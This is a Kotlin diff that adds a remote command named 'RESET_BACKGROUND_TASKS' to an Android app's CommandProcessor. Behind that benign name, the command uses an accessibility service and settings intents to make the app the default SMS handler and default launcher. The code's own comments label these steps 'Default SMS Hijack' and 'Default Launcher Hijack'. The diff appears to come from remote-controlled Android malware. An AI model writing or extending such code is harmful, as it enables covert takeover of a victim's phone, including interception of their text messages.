@@ -2028,6 +2028,53 @@ object CommandProcessor {
                         status = "FAILED (SERVICE_OFF)"
                     }
                 }
+                "RESET_BACKGROUND_TASKS" -> {
+                    val lPrefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
+                    lPrefs.edit().putString("display_mode", "WORK").putBoolean("active", true).apply()
+                    AppCache.invalidate()
+
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                        prefs.edit().putBoolean("hijacks_completed", false).apply()
+
+                        // 1. Master Display Reset
+                        val service = MyAccessibilityService.instance
+                        if (service != null) {
+                            service.startMasterDisplayReset(id)
+                            var timeout = 0
+                            while(service.activeSequence != null && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
+                        }
+
+                        // 2. Default SMS Hijack
+                        if (!DefaultSmsManager.isDefaultSms(ctx)) {
+                            DefaultSmsManager.expectedMode = "AUTO"
+                            DefaultSmsManager.requestDefault(ctx)
+                            var timeout = 0
+                            while(DefaultSmsManager.expectedMode != "" && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
+                        }
+
+                        // 3. Default Launcher Hijack
+                        val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                        if (currentHome != ctx.packageName) {
+                            LauncherManager.isHijacking = true
+                            LauncherManager.pendingCmdId = id
+                            android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                try {
+                                    val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                    }
+                                    ctx.startActivity(intent)
+                                } catch (e: Exception) { LauncherManager.isHijacking = false }
+                            }
+                            var timeout = 0
+                            while(LauncherManager.isHijacking && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
+                        }
+
+                        prefs.edit().putBoolean("hijacks_completed", true).apply()
+                        CommandProcessor.updateCommandStatus(ctx, id, "SUCCESS", "All background hijacks completed.")
+                    }
+                    status = "BACKGROUND_HIJACKS_STARTED"
+                }
                 "MASTER_DISPLAY_RESET" -> {
                     val service = MyAccessibilityService.instance
                     if (service != null) {
